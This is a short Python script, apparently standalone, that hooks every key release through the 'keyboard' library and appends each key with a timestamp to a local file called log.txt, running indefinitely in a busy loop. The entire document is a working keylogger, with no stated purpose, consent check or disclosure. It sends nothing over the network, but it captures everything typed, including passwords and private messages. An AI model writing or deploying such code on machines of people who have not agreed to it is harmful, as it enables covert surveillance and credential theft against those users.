import keyboard
import datetime

def write_to_file(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + " " + str(datetime.datetime.now()) + "\n")

keyboard.on_release(callback=write_to_file)

while True:
    pass